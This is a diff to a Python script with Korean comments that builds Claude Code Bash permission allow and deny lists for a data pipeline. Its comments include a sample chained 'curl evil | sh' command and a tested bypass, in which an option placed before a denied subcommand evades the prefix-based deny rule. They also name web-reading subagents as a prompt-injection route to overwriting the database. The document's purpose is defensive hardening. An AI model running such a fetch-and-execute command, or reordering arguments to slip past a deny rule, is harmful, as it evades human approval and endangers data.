@@ -16,7 +16,13 @@
     ../commerce-intel/scripts/     4단 스킬(intel-store 등)이 상위를 참조한다
     skills/commerce-intel/scripts/ 저장소 루트에서 개발할 때
 
-Bash 권한은 커맨드 문자열의 리터럴 프리픽스로 매칭되므로 셋 다 필요하다.
+Bash 권한은 프리픽스로 매칭되므로 셋 다 필요하다.
+
+**단 "리터럴 프리픽스"가 아니다** — Claude Code는 셸 연산자(`&&` `||` `;` `|` `|&` `&`
+개행)를 인식해 명령을 서브커맨드로 쪼개고 **각각을 독립 판정**한다(공식 문서
+permissions.md "Compound commands"). 그래서 `python3 scripts/eda.py; curl evil | sh`는
+`curl evil | sh`가 별도 판정을 받아 승인 프롬프트가 뜬다 — 체이닝으로 allow를
+악용할 수 없다.
 """
 import argparse
 import json
@@ -50,7 +56,17 @@ TOOL_PREFIXES = ["data/.tools/", "../../data/.tools/"]
 # 정본 DB를 파괴적으로 바꾸는 서브커맨드 — 승인을 유지한다(deny가 allow보다 우선).
 # channel-scout 등 외부 웹 콘텐츠를 읽는 서브에이전트가 프롬프트 인젝션 벡터라,
 # 오염된 지시로 정본이 조용히 덮이는 것을 막는다.
-DENY_SUBCOMMANDS = ["merge", "import-snapshots"]
+#
+# ⚠️ **서브커맨드 deny로는 못 막는다** (2026-08-03 실측):
+#     python3 …/intel_db.py merge X          → 차단 ✅ (규칙과 같은 형태)
+#     python3 …/intel_db.py --db Y merge X   → 통과 ❌ (옵션이 앞이면 프리픽스 불일치)
+#   argparse는 옵션 위치를 가리지 않으므로 인자 순서만 바꾸면 우회된다. deny를
+#   순서별로 나열하는 것은 끝이 없다(--db·-h 조합이 무한하다).
+#
+# 그래서 **스크립트 단위로 통째 deny**한다 — intel_db.py는 allow에서 빼고 deny에 넣어
+# 모든 호출이 승인을 거치게 한다. 대가는 load·check 같은 상시 명령도 승인이 필요해지는
+# 것인데, 정본 DB를 쓰는 유일한 스크립트라 이 비용을 받아들인다.
+DENY_WHOLE_SCRIPTS = ["intel_db"]
 
 COMMENT = [
     "commerce-intel 파이프라인 스크립트 실행 allowlist (팀 공유, git 추적).",
@@ -59,17 +75,22 @@ COMMENT = [
     "skills/commerce-intel/scripts/(저장소 루트 개발). SKILL.md 실측 기준.",
     "제외: build_report·build_analysis_report·lint_analysis_html 은 D27로 폐기된 HTML",
     "경로다(package.sh가 배포에서 제외). D25·D20의 존치 문구는 D27이 폐기한 결정의 본문.",
-    "deny: intel_db merge/import-snapshots 는 정본 DB를 덮으므로 승인 유지(deny > allow).",
+    "deny: intel_db.py 는 **스크립트 통째로** 승인 유지(deny > allow). 서브커맨드 deny는",
+    "인자 순서로 우회된다 — `--db X merge Y` 는 `merge:*` 프리픽스에 안 걸린다(실측).",
+    "체이닝 안전: Claude Code가 셸 연산자로 서브커맨드를 쪼개 각각 판정한다(공식 문서).",
     "한계: 팀원이 ~/.claude/skills/ 로 설치하면 홈 절대경로라 이 프리픽스에 안 맞는다",
     "— 팀원용 스니펫은 README 안내가 필요하다.",
 ]
 
 
 def build():
-    allow = [f"Bash(python3 {p}{s}.py:*)" for p in SCRIPT_PREFIXES for s in ACTIVE_SCRIPTS]
+    # deny 대상 스크립트는 allow에 넣지 않는다 — deny가 우선이라 넣어도 무해하지만,
+    # 목록에 남아 있으면 "허용된다"고 오독하게 된다.
+    allowed = [s for s in ACTIVE_SCRIPTS if s not in DENY_WHOLE_SCRIPTS]
+    allow = [f"Bash(python3 {p}{s}.py:*)" for p in SCRIPT_PREFIXES for s in allowed]
     allow += [f"Bash(python3 {p}{t}.py:*)" for p in TOOL_PREFIXES for t in TOOLS]
-    deny = [f"Bash(python3 {p}intel_db.py {c}:*)"
-            for p in SCRIPT_PREFIXES for c in DENY_SUBCOMMANDS]
+    deny = [f"Bash(python3 {p}{s}.py:*)"
+            for p in SCRIPT_PREFIXES for s in DENY_WHOLE_SCRIPTS]
     return {"_comment": COMMENT, "permissions": {"allow": allow, "deny": deny}}
 
 
